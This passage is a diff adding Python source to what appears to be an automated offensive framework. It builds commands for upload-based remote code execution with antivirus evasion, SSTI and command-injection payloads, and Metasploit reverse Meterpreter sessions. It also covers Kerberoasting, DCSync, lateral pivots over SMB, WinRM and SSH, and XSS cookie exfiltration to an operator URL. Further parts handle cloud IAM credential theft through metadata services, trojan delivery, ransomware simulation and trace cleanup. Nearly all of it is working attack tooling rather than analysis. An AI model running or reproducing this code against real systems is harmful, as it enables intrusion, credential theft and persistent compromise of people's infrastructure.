+    The probe itself is one bounded request — non-destructive, no exploit
+    side effects.
+    """
+    import random
+    import tempfile
+    target, port = _web_service_target(wm)
+    marker = f"PHANTOM_RCE_{random.randint(100000, 999999)}"
+    payload = ("import os\n"
+               f"print('{marker}:'+str(os.getuid()))\n")
+    # write the payload to a NON-.py temp file (av anti-exec heuristics on
+    # %TEMP% python files) and force the .py name on the wire with
+    # ;filename= so the target's upload handler still executes it
+    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
+        tf.write(payload)
+        tmp = tf.name
+    scheme = _web_scheme(wm, port)
+    # P0: probe the paths the app ITSELF references (web_path findings from
+    # http_get) plus the conventional default. One bounded request each, so
+    # the probe still costs what it always cost; it just stops assuming that
+    # every upload handler lives at /upload.
+    paths = []
+    try:
+        for f in wm.find("web_path"):
+            v = f.value if isinstance(f.value, dict) else {}
+            p = str(v.get("path", "") or "").strip()
+            if p.startswith("/") and p not in paths:
+                paths.append(p)
+    except Exception:
+        paths = []
+    try:
+        discovered = _probeable_paths(
+            _discover_web_paths(f"{scheme}://{_hport(target, port)}"))
+        # The app's own handler beats a guessed default; keep /upload as a
+        # fallback for apps that really do use it.
+        paths = [p for p in discovered if p not in paths] + paths
+    except Exception:
+        pass
+    for p in _DEFAULT_UPLOAD_PATHS:
+        if p not in paths:
+            paths.append(p)
+    netloc = _hport(target, port)
+    segments = []
+    for p in paths[:6]:
+        url = f"{scheme}://{netloc}{p}"
+        # Tag the hit with the URL that produced it: beacon_via_rce must
+        # re-use the handler that actually executed, not assume /upload.
+        segments.append(
+            f"curl -s -k -m 8 -F 'file=@{tmp};filename=probe.py' "
+            f"{url} | grep -o '{marker}:[0-9]*' | "
+            f"sed 's#^#RCE_HIT:{url}:#' || true")
+    probes = _join_local_shell(segments)
+    tried = " ".join(f"{scheme}://{netloc}{p}" for p in paths[:6])
+    return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
+
+
+def _web_rce_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: a PHANTOM_RCE_<n>:<uid> marker proves code execution on
+    the box -> rce_foothold finding (usable by beacon_via_rce)."""
+    import re
+    from urllib.parse import urlsplit
+    findings = []
+    hit = re.search(
+        r"RCE_HIT:(https?://\S+?):(PHANTOM_RCE_\d+):(\d+)", output)
+    m = hit or re.search(r"(PHANTOM_RCE_\d+):(\d+)", output)
+    if m:
+        value = {"vector": "arbitrary-file-upload",
+                 "uid": m.group(3) if hit else m.group(2)}
+        if hit:
+            url = hit.group(1)
+            parsed = urlsplit(url)
+            value.update({
+                "url": url,
+                "path": parsed.path or "/",
+                "scheme": parsed.scheme or "http",
+                "port": str(parsed.port or (443 if parsed.scheme == "https" else 80)),
+            })
+        findings.append(Finding(
+            kind="rce_foothold", key="web_upload",
+            value=value,
+            confidence=0.9, source="web_rce",
+            evidence=output.strip()[:300]))
+    return findings
+
+
+def _ad_enum_adapter(wm, slots):
+    from phantom.automation.post.ad import ad_enum_command
+    domain = slots.get("domain") or _ad_domain(wm)
+    return ad_enum_command(domain, wm.target)
+
+
+def _kerberoast_adapter(wm, slots):
+    from phantom.automation.post.ad import kerberoast_command
+    domain = slots.get("domain") or _ad_domain(wm)
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    if not (domain and user and pw):
+        raise ValueError("kerberoast requires a domain and valid credentials")
+    return kerberoast_command(domain, user, pw, _ad_dc(wm))
+
+
+def _lateral_adapter(wm, slots):
+    from phantom.automation.post.lateral import lateral_pivot_command
+    host = slots.get("host", "")
+    if not host:
+        raise ValueError("lateral pivot requires a peer host")
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    payload = slots.get("payload") or _beacon_payload(wm)
+    # The remote SHELL differs by family on the same SSH transport: an
+    # unfingerprinted peer keeps the POSIX launcher (what this always did),
+    # a known Windows peer gets `start /b cmd /c` instead of `nohup &`.
+    return lateral_pivot_command(host, user, pw, payload,
+                                 os_name=slots.get("os", ""))
+
+
+def _smb_adapter(wm, slots):
+    from phantom.automation.post.lateral import smb_pivot_command
+    host = slots.get("host", "")
+    if not host:
+        raise ValueError("smb pivot requires a peer host")
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    payload = slots.get("payload") or _beacon_payload(wm)
+    return smb_pivot_command(host, user, pw, payload, domain=_ad_domain(wm))
+
+
+def _winrm_adapter(wm, slots):
+    from phantom.automation.post.lateral import winrm_pivot_command
+    host = slots.get("host", "")
+    if not host:
+        raise ValueError("winrm pivot requires a peer host")
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    payload = slots.get("payload") or _beacon_payload(wm)
+    return winrm_pivot_command(host, user, pw, payload, domain=_ad_domain(wm))
+
+
+def _as_rep_adapter(wm, slots):
+    from phantom.automation.post.ad import as_rep_roast_command
+    domain = slots.get("domain") or _ad_domain(wm)
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    if not (domain and user and pw):
+        raise ValueError("as_rep_roast requires a domain and valid credentials")
+    return as_rep_roast_command(domain, user, pw, _ad_dc(wm))
+
+
+def _dc_sync_adapter(wm, slots):
+    from phantom.automation.post.ad import dc_sync_command
+    domain = slots.get("domain") or _ad_domain(wm)
+    user, pw = slots.get("username", ""), slots.get("password", "")
+    if not (domain and user and pw):
+        raise ValueError("dc_sync requires a domain and valid credentials")
+    return dc_sync_command(domain, user, pw, _ad_dc(wm))
+
+
+def _hash_crack_adapter(wm, slots):
+    from phantom.automation.post.ad import hash_crack_command
+    hash_val = slots.get("hash", "")
+    if not hash_val:
+        for f in wm.find("ad_creds"):
+            if f.value.get("hash"):
+                hash_val = str(f.value["hash"])
+                break
+    if not hash_val:
+        raise ValueError("hash_crack requires a captured AD hash (kerberoast / as_rep / dc_sync)")
+    return hash_crack_command(hash_val)
+
+
+def _cleanup_adapter(wm, slots):
+    from phantom.automation.post.cleanup import cleanup_command
+    os_name = slots.get("os") or _target_os(wm)
+    payload = slots.get("payload") or _beacon_payload(wm)
+    return cleanup_command(os_name, payload)
+
+
+def _cookies_adapter(wm, slots):
+    from phantom.automation.post.harvest import cookies_command
+    return cookies_command()
+
+
+def _bt_scan_adapter(wm, slots):
+    from phantom.automation.post.harvest import bt_scan_command
+    return bt_scan_command()
+
+
+def _cdp_cookies_adapter(wm, slots):
+    from phantom.automation.post.harvest import cdp_cookies_command
+    return cdp_cookies_command(port=int(slots.get("port") or 9222))
+
+
+def _socks_adapter(wm, slots):
+    from phantom.automation.post.harvest import socks_command
+    return socks_command(port=int(slots.get("port") or 1080))
+
+
+def _ransom_sim_adapter(wm, slots):
+    from phantom.automation.post.ransom_sim import ransom_sim_command
+    return ransom_sim_command(slots.get("dir") or ".")
+
+
+def _trojan_deliver_adapter(wm, slots):
+    """Supply-chain delivery: stage the bundle on the operator host (real
+    carrier + staged beacon payload) and drop it on the target.
+
+    When the agent carries trojan assets (carrier/payload), the overlay
+    bundle is built HERE — this is the consumer of trojan_bundle.py. Without
+    assets the command is the plain beacon-side drop.
+    """
+    from phantom.automation.post.trojan import (
+        trojan_deliver_command, TrojanDeliverer)
+    carrier = slots.get("carrier")
+    payload = slots.get("payload")
+    bundle = slots.get("bundle")
+    if carrier and payload and not bundle:
+        staging = slots.get("staging")
+        deliverer = (TrojanDeliverer(staging) if staging
+                     else TrojanDeliverer())
+        bundle = deliverer.stage(carrier, payload)
+    return trojan_deliver_command(slots.get("dir") or ".", bundle or "")
+
+
+def _best_fingerprinted_module(wm):
+    """The highest-severity CVE module matching a fingerprinted service.
+
+    Returns (module, service_finding) or None. Product/version come from
+    the `service` findings (nmap -sV), lower-cased for the registry.
+    """
+    from phantom.automation.exploit.modules import module_registry
+    best = None
+    for f in wm.find("service"):
+        product = (f.value.get("product") or "").lower()
+        if not product:
+            continue
+        version = str(f.value.get("version") or "")
+        module = module_registry.match(product, version or None)
+        if module is None:
+            continue
+        if best is None or module.severity > best[0]:
+            best = (module.severity, module, f)
+    return (best[1], best[2]) if best else (None, None)
+
+
+def _dynamic_cve_hit(wm):
+    """Best live-NVD correlation hit for the fingerprinted services.
+
+    The static registry covers the curated top; this covers the long tail:
+    every fingerprinted product@version not in the registry is queried
+    against the live NVD API (cached, offline-safe) and the highest-scoring
+    hit is returned as (cve, product, version, score, port) or None.
+    """
+    try:
+        from phantom.automation.exploit.resolver import get_resolver
+        from phantom.automation.exploit.modules import module_registry
+        from phantom.automation.exploit.modules.registry import normalize_product
+    except Exception:
+        return None
+    best = None
+    for f in wm.find("service"):
+        product = (f.value.get("product") or "").strip().lower()
+        version = str(f.value.get("version") or "").strip()
+        if not product or not version:
+            continue
+        if module_registry.match(product, version):
+            continue  # already covered by the static registry
+        try:
+            hits = get_resolver().lookup(normalize_product(product), version)
+        except Exception:
+            continue
+        for hit in hits or []:
+            score = float(hit.get("score") or 0)
+            if best is None or score > best[3]:
+                port = str(f.value.get("port") or "")
+                best = (hit.get("cve", ""), product, version, score, port)
+    return best
+
+
+def _service_exploit_adapter(wm, slots):
+    """Version-matched exploit command, built dynamically from the WM.
+
+    Three-tier weaponization:
+      1. static registry match (curated, offline, pre-validated probes)
+      2. dynamic CVE correlation (live NVD) + msf console `search cve:<id>`
+         to discover the weaponizing module — the catalog is genuinely
+         dynamic, never a hardcoded long list
+      3. no weaponizable module -> CVE_NOTE: knowledge finding (the
+         bug-class path / rce_foothold stays the alternative)
+    Appends the EXPLOIT: marker so the interpreter records the plan.
+    """
+    from phantom.automation.exploit.synthesis import (
+        synthesize_command, pick_port)
+    from phantom.automation.exploit.payloads import PayloadFactory
+    from phantom.automation.exploit.modules.registry import ExploitModule
+    target = _effective_target(wm)
+    platform = _target_os(wm)
+    pf = PayloadFactory()
+    spec = pf.spec(platform=platform, arch="x64")
+    # The exploit handler has its OWN callback port. Reusing c2.port made
+    # the handler collide with the beacon listener, and c2.host=127.0.0.1
+    # made every remote exploit dial the operator's loopback.
+    from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
+    lhost = _msf_lhost()
+    lport = _msf_lport()
+
+    module, svc = _best_fingerprinted_module(wm)
+    if module is not None:
+        port = str(svc.value.get("port") or pick_port(module))
+        return synthesize_command(module, target, port, payload_spec=spec,
+                                  lhost=lhost, lport=lport)
+
+    # dynamic tier: live NVD correlation + msf module discovery
+    hit = _dynamic_cve_hit(wm)
+    if hit is None:
+        raise ValueError(
+            "no exploit module matches the fingerprinted services")
+    cve, product, version, score, port = hit
+    port = port or pick_port(ExploitModule(cve_id=cve, name="", software=product,
+                                           description="", msf_module=""), "80")
+    try:
+        from phantom.automation.runtime.msf import search_module_for_cve
+        msf_module = search_module_for_cve(cve)
+    except Exception:
+        msf_module = None
+    if msf_module:
+        dyn = ExploitModule(
+            cve_id=cve, name=f"{product} (dynamic NVD correlation)",
+            software=product,
+            description=f"CVE {cve} correlated live; weaponized via msf search",
+            msf_module=msf_module, kind="rce", severity=score,
+            rank="good", payloads={}, notes="dynamic")
+        return synthesize_command(dyn, target, port, payload_spec=spec,
+                                  lhost=lhost, lport=lport)
+    # knowledge only: no weaponizing module exists / msf unavailable
+    return (f"echo CVE_NOTE: cve={cve} software={product} "
+            f"version={version} severity={score:g} port={port}")
+
+
+def _service_exploit_interp(output, wm, slots):
+    """Parse EXPLOIT: and CVE_NOTE: markers into exploit-plan findings."""
+    from phantom.automation.belief import Finding
+    findings = []
+    for line in (output or "").splitlines():
+        kv = {}
+        for chunk in line.split()[1:]:
+            if "=" in chunk:
+                k, v = chunk.split("=", 1)
+                kv[k.strip()] = v.strip()
+        if line.startswith("EXPLOIT:"):
+            cve = kv.get("cve")
+            if not cve:
+                continue
+            findings.append(Finding(
+                kind="exploit_plan", key=cve,
+                value={"cve": cve, "software": kv.get("software", ""),
+                       "msf_module": kv.get("msf", ""),
+                       "kind": kv.get("kind", "rce"),
+                       "severity": kv.get("severity", ""),
+                       "target": kv.get("target", wm.target),
+                       "port": kv.get("port", "")},
+                confidence=0.9, source="service_exploit", target=wm.target))
+        elif line.startswith("CVE_NOTE:"):
+            cve = kv.get("cve")
+            if not cve:
+                continue
+            # knowledge-only: no weaponizing module — recorded so the
+            # reasoning engine can still derive bug-class paths, never
+            # treated as an RCE plan (kind="note" is ignored by rce_foothold)
+            findings.append(Finding(
+                kind="exploit_plan", key=cve,
+                value={"cve": cve, "software": kv.get("software", ""),
+                       "version": kv.get("version", ""),
+                       "msf_module": "", "kind": "note",
+                       "severity": kv.get("severity", ""),
+                       "target": wm.target, "port": kv.get("port", "")},
+                confidence=0.6, source="service_exploit", target=wm.target))
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# RCE bridge: confirmed candidate -> command execution -> beacon
+# ---------------------------------------------------------------------------
+
+def _cmdi_inject_endpoint(endpoint: str, command: str) -> Optional[str]:
+    """Replace the value of the first GET parameter in a hunt endpoint
+    with ``command``, preserving the injection separator style the hunt
+    engine detected (;id, |id, &&id, %0aid ...).
+
+    Returns the new endpoint path or None when no injectable parameter
+    exists (the cmdi hit was on a POST body, which the foothold adapter
+    does not yet support).
+    """
+    import urllib.parse
+    m = re.search(r"([?&])([A-Za-z0-9_\-]+)=([^&#]*)", endpoint)
+    if not m:
+        return None
+    prefix = m.group(1)
+    param = m.group(2)
+    current = m.group(3)
+    # detect the separator already present in the detected payload
+    sep = ";"
+    for s in ("%0a", "%0A", "&&", "||", "|", ";"):
+        if s in current:
+            sep = s
+            break
+    cmd = f"1{sep}{command}"
+    encoded = urllib.parse.quote(cmd, safe="")
+    return re.sub(r"([?&])([A-Za-z0-9_\-]+)=[^&#]*",
+                  lambda mm: f"{prefix}{param}={encoded}", endpoint, count=1)
+
+
+def _pick_xss_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
+    """Highest-score CONFIRMED reflected-XSS anomaly (endpoint known)."""
+    best = None
+    for f in wm.find("hunt_anomaly"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if v.get("cls") != "xss" or not v.get("confirmed"):
+            continue
+        try:
+            score = float(v.get("score") or 0)
+        except (TypeError, ValueError):
+            score = 0.0
+        if best is None or score > best[0]:
+            best = (score, {"port": str(v.get("port") or "80"),
+                            "endpoint": v.get("endpoint") or "/",
+                            "name": v.get("name") or "",
+                            "evidence": v.get("evidence") or ""})
+    return best[1] if best else None
+
+
+def _has_confirmed_xss():
+    """Precondition: a CONFIRMED reflected-XSS anomaly with a known
+    endpoint."""
+    def _requires_xss(wm: WorldModel) -> bool:
+        return _pick_xss_candidate(wm) is not None
+    return _requires_xss
+
+
+def _has_confirmed_rce():
+    """Precondition: a CONFIRMED command-execution candidate exists — a
+    confirmed SSTI anomaly (endpoint known) or an RCE-kind exploit plan."""
+    def _requires_rce(wm: WorldModel) -> bool:
+        return _pick_rce_candidate(wm) is not None
+    return _requires_rce
+
+
+def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
+    """Highest-value command-execution candidate: confirmed SSTI first
+    (endpoint known, deterministic), then RCE-kind exploit plans.
+    Returns a dict describing the channel or None."""
+    best = None
+    for f in wm.find("hunt_anomaly"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if v.get("cls") not in ("ssti", "cmdi") or not v.get("confirmed"):
+            continue
+        try:
+            score = float(v.get("score") or 0)
+        except (TypeError, ValueError):
+            score = 0.0
+        if best is None or score > best[0]:
+            best = (score, {"channel": v.get("cls"),
+                            "port": str(v.get("port") or "80"),
+                            "endpoint": v.get("endpoint") or "/",
+                            "evidence": v.get("evidence") or ""})
+    plans = []
+    for f in wm.find("exploit_plan"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if str(v.get("kind", "")).lower() != "rce":
+            continue
+        plans.append({
+            "channel": "msf", "port": str(v.get("port") or ""),
+            "msf_module": str(v.get("msf_module") or ""),
+            "cve": str(v.get("cve") or ""),
+        })
+
+    def _enrich_from_plan(cand):
+        """A confirmed foothold may borrow its module from a matching plan.
+
+        The PLAN is never allowed to create a foothold on its own; it only
+        supplies the module path when the foothold itself was already
+        verified by an MSF session or a local PoC.
+        """
+        if cand.get("channel") != "msf" or cand.get("msf_module"):
+            return cand
+        cve = str(cand.get("cve") or "").upper()
+        port = str(cand.get("port") or "")
+        for plan in plans:
+            if cve and str(plan.get("cve") or "").upper() == cve:
+                cand.update({k: v for k, v in plan.items() if v})
+                return cand
+            if port and port == str(plan.get("port") or ""):
+                cand.update({k: v for k, v in plan.items() if v})
+                return cand
+        if len(plans) == 1 and plans[0].get("msf_module"):
+            cand.update({k: v for k, v in plans[0].items() if v})
+        return cand
+
+    for f in wm.find("rce_foothold"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if v.get("key") == "web_upload" or v.get("vector") == "arbitrary-file-upload":
+            # reuse the same real-web-app port resolution as the probe
+            # (excludes the operator's own C2 listener port)
+            _h, port = _web_service_target(wm)
+            return {"channel": "web_upload",
+                    "port": str(v.get("port") or port),
+                    "path": v.get("path") or "",
+                    "scheme": v.get("scheme") or "",
+                    "url": v.get("url") or "",
+                    "evidence": v.get("evidence") or ""}
+        # A foothold verified by a local PoC (channel=poc) or by a real
+        # Meterpreter/shell session (channel=msf) is a first-class delivery
+        # channel. A plan only enriches it with the module path; a plan by
+        # itself is NOT command execution and must never reach this bridge.
+        ch = str(v.get("channel") or "").strip().lower()
+        if ch in ("poc", "msf"):
+            cand = {"channel": ch, "port": str(v.get("port") or ""),
+                    "cve": str(v.get("cve") or ""),
+                    "msf_module": str(v.get("msf_module") or ""),
+                    "evidence": v.get("evidence") or ""}
+            cand = _enrich_from_plan(cand)
+            if ch == "msf" and not cand.get("msf_module"):
+                continue
+            return cand
+    # Confirmed web anomalies beat a bare plan. The plan-only fallback was
+    # removed: a marker from `synthesize_command` is a plan, not an RCE.
+    return best[1] if best else None
+
+
+def _xss_weaponize_adapter(wm, slots):
+    """Turn a CONFIRMED reflection into the session-theft asset.
+
+    The hunt engine proved the raw payload is reflected UNENCODED in an
+    HTML context; this builds the exfiltration payload that ships the
+    victim's session to the operator's capture URL, plus the ready-to-send
+    PoC URL at the exact injection point. Honest limit: delivery still
+    needs a victim, so this produces the WEAPON, not a compromise.
+    """
+    cand = _pick_xss_candidate(wm)
+    if cand is None:
+        raise ValueError("no confirmed XSS candidate")
+    from phantom.automation.exploit.xss import (
+        xss_exfil_payload, xss_poc_url)
+    exfil = str((slots or {}).get("exfil_url") or "").strip()
+    if not exfil:
+        raise ValueError("xss_weaponize requires the exfil_url slot "
+                         "(the operator's capture endpoint)")
+    steal = str((slots or {}).get("steal") or "cookie").lower()
+    payload = xss_exfil_payload(exfil, steal=steal)
+    poc = xss_poc_url(cand["endpoint"], payload)
+    return "\n".join([
+        f"XSS_EXFIL:steal={steal}",
+        f"XSS_ENDPOINT:{cand['endpoint']}",
+        f"XSS_POC:{poc or ''}",
+        f"XSS_PAYLOAD:{payload}",
+    ])
+
+
+def _xss_weaponize_interp(output, wm, slots):
+    """Parse XSS_EXFIL:/XSS_POC:/XSS_PAYLOAD: into an xss_exfil finding.
+    Line-prefixed (not space-split) because the payload contains spaces."""
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "XSS_EXFIL:" not in out:
+        return []
+    steal = endpoint = poc = payload = ""
+    for line in out.splitlines():
+        if line.startswith("XSS_EXFIL:"):
+            steal = line.split("=", 1)[1].strip() if "=" in line else ""
+        elif line.startswith("XSS_ENDPOINT:"):
+            endpoint = line.split(":", 1)[1].strip()
+        elif line.startswith("XSS_POC:"):
+            poc = line.split(":", 1)[1].strip()
+        elif line.startswith("XSS_PAYLOAD:"):
+            payload = line.split(":", 1)[1].strip()
+    if not payload:
+        return []
+    return [Finding(
+        kind="xss_exfil", key=f"xss:{endpoint or 'unknown'}",
+        value={"steal": steal, "endpoint": endpoint, "poc_url": poc,
+               "payload": payload},
+        confidence=0.85, source="xss_weaponize",
+        evidence=(payload or poc)[:300], target=wm.target)]
+
+
+def _rce_foothold_adapter(wm, slots):
+    """Verify command execution through a confirmed candidate.
+
+    * ssti channel: replace the template expression in the original
+      endpoint with an RCE payload that echoes a random marker;
+      marker in the response proves arbitrary command execution.
+    * ssrf channel: fetch the cloud metadata IAM path through the app's
+      SSRF (senior move: SSRF -> cloud IAM creds).
+    * msf channel: run the version-matched module and watch for a session.
+    """
+    cand = _pick_rce_candidate(wm)
+    if cand is None:
+        raise ValueError("no confirmed command-execution candidate")
+    target = _effective_target(wm)
+    marker = f"PHANTOM_RCE_{os.urandom(3).hex()}"
+    if cand["channel"] == "ssti":
+        import urllib.parse
+        payload = ("{{ cycler.__init__.__globals__.os.popen("
+                   f"'echo {marker}').read() }}")
+        endpoint = re.sub(
+            r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
+            urllib.parse.quote(payload, safe=""),
+            cand.get("endpoint") or "/")
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
+                f"| grep -o '{marker}' && echo RCE:channel=ssti "
+                f"marker={marker}")
+    if cand["channel"] == "cmdi":
+        # the hunt engine confirmed command injection on a GET param
+        # (e.g. /?cmd=1;id): re-inject the same endpoint with our marker
+        # as the command — a marker echo in the response proves arbitrary
+        # command execution on the box
+        import urllib.parse
+        endpoint = _cmdi_inject_endpoint(cand.get("endpoint") or "/",
+                                         f"echo {marker}")
+        if endpoint is None:
+            raise ValueError("cmdi endpoint has no injectable GET parameter")
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
+                f"| grep -o '{marker}' && echo RCE:channel=cmdi "
+                f"marker={marker}")
+    if cand["channel"] == "ssrf":
+        import urllib.parse
+        meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        payload = urllib.parse.quote(meta_url, safe="")
+        endpoint = re.sub(
+            r"https?://[^&'\"\\ ]+", payload,
+            cand.get("endpoint") or "/?url=", count=1)
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
+                f"| grep -Eo 'AccessKeyId|SecretAccessKey|Token' "
+                f"| head -1 && echo RCE:channel=ssrf marker={marker}")
+    if cand["channel"] == "msf":
+        module = cand.get("msf_module", "")
+        port = cand.get("port") or ""
+        if not module:
+            raise ValueError("RCE plan without msf module")
+        from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
+        lhost = _msf_lhost()
+        lport = _msf_lport()
+        rport = f"; set RPORT {port}" if port else ""
+        return (f"msfconsole -q -x \"use {module}; set RHOSTS {target}"
+                f"{rport}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; "
+                f"set LHOST {lhost}; set LPORT {lport}; "
+                "set ExitOnSession false; run -j; sleep 20; exit -y\" "
+                f"| tee /dev/stderr | grep -E "
+                f"'session \\d+ opened|Meterpreter session' "
+                f"&& echo RCE:channel=msf marker={marker}")
+    raise ValueError(f"unsupported RCE channel: {cand['channel']}")
+
+
+def _rce_foothold_interp(output, wm, slots):
+    """Parse RCE: markers into a confirmed foothold finding."""
+    from phantom.automation.belief import Finding
+    findings = []
+    out = output or ""
+    ch = ""
+    marker = ""
+    for line in out.splitlines():
+        if line.startswith("RCE:"):
+            for chunk in line[len("RCE:"):].split():
+                if "=" in chunk:
+                    k, v = chunk.split("=", 1)
+                    if k == "channel":
+                        ch = v.strip()
+                    elif k == "marker":
+                        marker = v.strip()
+    if not ch:
+        return findings
+    key = f"{ch}:{marker or os.urandom(3).hex()}"
+    if ch == "ssrf" and "AccessKeyId" in out:
+        findings.append(Finding(
+            kind="cloud_creds", key="iam",
+            value={"provider": "aws", "channel": "ssrf",
+                   "evidence": out[:300]},
+            confidence=0.8, source="rce_foothold", target=wm.target))
+    findings.append(Finding(
+        kind="rce_foothold", key=key,
+        value={"channel": ch, "marker": marker, "evidence": out[:300]},
+        confidence=0.9, source="rce_foothold", target=wm.target))
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# delivery family -> delivery_kit.py
+# ---------------------------------------------------------------------------
+# One confirmed channel, one command string: the upload / ssti / cmdi / poc /
+# msf builders moved to their own module (2026-11-05, monolith split). They are
+# re-exported HERE, so every adapter and test that imports them from `kit`
+# keeps working without touching a call site.
+from phantom.automation.guidance.delivery_kit import (  # noqa: E402,F401
+    _beacon_via_rce_adapter,
+    _msf_beacon_delivery,
+)
+
+
+def _env_internal_adapter(wm, slots):
+    """Environment probe FROM INSIDE the beacon: container markers and
+    AWS metadata via the IMDS v2 token flow. Only meaningful post-beacon
+    (link-local metadata is reachable only from the box itself)."""
+    return (
+        "echo __ENV_BEGIN__; "
+        "cat /proc/1/cgroup 2>/dev/null "
+        "| grep -Eo 'docker|kubepods|containerd|lxc' | head -1; "
+        "test -f /.dockerenv && echo __ENV_CONTAINER__; "
+        "TOKEN=$(curl -m 2 -s -X PUT 'http://169.254.169.254/latest/api/token' "
+        "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); "
+        "curl -m 2 -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
+        "http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5; "
+        "echo __ENV_END__"
+    )
+
+
+def _env_probe_adapter(wm, slots):
+    """Recognize the environment from the OUTSIDE: exposed management
+    APIs (Docker/K8s) and SCADA/ICS port classes. Cloud metadata is NOT
+    probed from the operator box (link-local would leak the OPERATOR's
+    own cloud, not the target's) — it is reached through SSRF or the
+    beacon instead."""
+    target = _effective_target(wm)
+    ports = {str(s.value.get("port") or "") for s in wm.find("service")
+             if isinstance(s.value, dict)}
+    names = " ".join(str(s.value.get("service") or "").lower()
+                     for s in wm.find("service")
+                     if isinstance(s.value, dict))
+    cmds = []
+    if "2375" in ports or "2376" in ports:
+        cmds.append(f"curl -m 4 -s http://{target}:2375/version "
+                    "2>/dev/null | head -c 300 && echo __ENV_DOCKER__")
+        cmds.append(f"curl -m 4 -s http://{target}:2375/containers/json "
+                    "2>/dev/null | head -c 200 && echo __ENV_DOCKER_PS__")
+    if any(p in ports for p in ("6443", "10250", "10255")):
+        cmds.append(f"curl -m 4 -sk https://{target}:6443/version "
+                    "2>/dev/null | head -c 300 && echo __ENV_K8S__")
+    if any(p in ports for p in ("502", "102", "20000", "47808", "4840")):
+        cmds.append(f"echo __ENV_SCADA__ && "
+                    f"echo 'scada/ics ports open: 502,102,20000,47808,4840'")
+    if "modbus" in names or "s7" in names or "dnp3" in names:
+        cmds.append(f"echo __ENV_SCADA__ && echo 'scada/ics protocol: {names}'")
+    if not cmds:
+        cmds.append(f"echo __ENV_NONE__ && echo 'no management APIs detected'")
+    return _join_local_shell(cmds)
+
+
+def _env_probe_interp(output, wm, slots):
+    """Parse __ENV_* markers (and raw container/cloud signals) into an
+    `environment` finding. Shared by the outside probe and the internal
+    (post-beacon) probe."""
+    from phantom.automation.belief import Finding
+    out = output or ""
+    kinds = []
+    if "__ENV_DOCKER__" in out:
+        kinds.append({"kind": "container", "engine": "docker",
+                      "detail": "Docker API reachable (2375)"})
+    elif re.search(r"\b(docker|kubepods|containerd)\b", out):
+        kinds.append({"kind": "container", "detail": "container markers inside the box"})
+    if "__ENV_K8S__" in out:
+        kinds.append({"kind": "kubernetes", "detail": "Kubernetes API reachable (6443)"})
+    if "__ENV_SCADA__" in out:
+        kinds.append({"kind": "scada", "detail": "SCADA/ICS protocols exposed"})
+    if re.search(r"\b(ami-id|instance-id)\b", out):
+        kinds.append({"kind": "cloud", "provider": "aws",
+                      "detail": "AWS metadata reachable from inside the box"})
+    if not kinds:
+        return []
+    return [Finding(
+        kind="environment", key="env",
+        value={"kinds": kinds, "raw": out[:300]},
+        confidence=0.7, source="env_probe", target=wm.target)]
+
+
+# ---------------------------------------------------------------------------
+# cloud / IAM credentials harvesting (post-beacon)
+# ---------------------------------------------------------------------------
+
+def _cloud_creds_adapter(wm, slots):
+    """Capture cloud instance credentials from inside the beacon via the
+    metadata services. Tries each provider's metadata endpoint."""
+    return (
+        "echo __CLOUD_START__; "
+        # AWS IMDSv2 (token then role creds)
+        "T=$(curl -m 2 -s -X PUT 'http://169.254.169.254/latest/api/token' "
+        "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null); "
+        "R=$(curl -m 2 -s -H \"X-aws-ec2-metadata-token: $T\" "
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
+        "2>/dev/null | head -1); "
+        "test -n \"$R\" && echo __CLOUD_AWS_ROLE__=$R && "
+        "curl -m 2 -s -H \"X-aws-ec2-metadata-token: $T\" "
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R "
+        "2>/dev/null | grep -Eo '\"(AccessKeyId|SecretAccessKey|Token)\"\\s*:\\s*\"[^\"]+\"' "
+        "| head -3; "
+        # GCP metadata
+        "curl -m 2 -s -H 'Metadata-Flavor: Google' "
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ "
+        "2>/dev/null | head -2 && echo __CLOUD_GCP__; "
+        # Azure (managed identity) — needs the identity endpoint via IMDS
+        "curl -m 2 -s -H 'Metadata: true' "
+        "'http://169.254.169.254/metadata/instance?api-version=2021-02-01' "
+        "2>/dev/null | head -c 200 && echo __CLOUD_AZURE__; "
+        "echo __CLOUD_END__"
+    )
+
+
+def _cloud_creds_interp(output, wm, slots):
+    """Parse __CLOUD_* markers into a cloud_creds + environment finding."""
+    from phantom.automation.belief import Finding
+    out = output or ""
+    findings = []
+    provider = ""
+    if "__CLOUD_AWS_ROLE__" in out and "AccessKeyId" in out:
+        provider = "aws"
+        findings.append(Finding(
+            kind="cloud_creds", key="iam_aws",
+            value={"provider": "aws", "via": "metadata",
+                   "evidence": out[:500]},
+            confidence=0.95, source="cloud_creds_harvest", target=wm.target))
+    elif "__CLOUD_GCP__" in out:
+        provider = "gcp"
+        findings.append(Finding(
+            kind="cloud_creds", key="iam_gcp",
+            value={"provider": "gcp", "via": "metadata",
